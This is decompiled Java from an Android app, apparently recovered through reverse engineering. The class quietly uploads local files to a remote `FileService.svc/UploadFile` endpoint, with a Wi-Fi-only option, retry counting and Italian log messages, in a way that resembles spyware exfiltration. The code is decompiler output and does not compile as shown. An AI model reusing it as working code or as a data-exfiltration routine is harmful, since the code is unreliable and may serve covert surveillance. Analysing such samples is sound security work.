package com.app.system.common.d.a;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import com.app.system.common.entity.FileEntry;
import com.security.ServiceSettings;
import java.io.File;
import java.util.Hashtable;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class h
  extends a
{
  public static Hashtable<String, Integer> d = new Hashtable();
  private Context e;
  
  public h(Context paramContext, String paramString)
  {
    super(null, paramString);
    this.e = paramContext;
  }
  
  public int a(FileEntry paramFileEntry)
  {
    Object localObject1 = (Integer)d.get(paramFileEntry.mFileName);
    if ((localObject1 != null) && (((Integer)localObject1).intValue() >= 3)) {
      return 1;
    }
    try
    {
      boolean bool;
      if (ServiceSettings.a().wifiOnlySend) {
        bool = ((ConnectivityManager)this.e.getSystemService("connectivity")).getNetworkInfo(1).isConnected();
      } else {
        bool = true;
      }
      if (bool)
      {
        localObject1 = new java/io/File;
        ((File)localObject1).<init>(paramFileEntry.mFileName);
        if (!((File)localObject1).exists())
        {
          localObject1 = this.e;
          localStringBuilder = new java/lang/StringBuilder;
          localStringBuilder.<init>();
          localStringBuilder.append("INVIO: FILE NON TROVATO: ");
          localStringBuilder.append(paramFileEntry.mFileName);
          com.app.system.common.h.a((Context)localObject1, localStringBuilder.toString());
          return -1;
        }
        Object localObject2 = this.e;
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("INVIO FILE ");
        localStringBuilder.append(paramFileEntry.mFileName);
        com.app.system.common.h.a((Context)localObject2, localStringBuilder.toString());
        localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append(this.c);
        localStringBuilder.append("/FileService.svc");
        localStringBuilder.append("/UploadFile");
        localStringBuilder.append('/');
        localStringBuilder.append(this.a);
        localObject1 = com.app.system.common.d.a.a.a.a(localStringBuilder.toString(), (File)localObject1);
        if (localObject1 != null)
        {
          localObject2 = ((Response)localObject1).body().string();
          localStringBuilder = new java/lang/StringBuilder;
          localStringBuilder.<init>();
          localStringBuilder.append("SendFile Result: ");
          localStringBuilder.append(localObject1);
          com.security.d.a.d("DBFiles", localStringBuilder.toString(), new Object[0]);
          if (((String)localObject2).equals("1")) {
            return 1;
          }
        }
      }
      else
      {
        com.security.d.a.d("DBFiles", "WIFI disconnesso -- invio file rimandato", new Object[0]);
      }
      return 0;
    }
    catch (Exception localException)
    {
      if ((Integer)d.get(paramFileEntry.mFileName) != null) {}
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/h.class
 *
 * Reversed by:           J
 */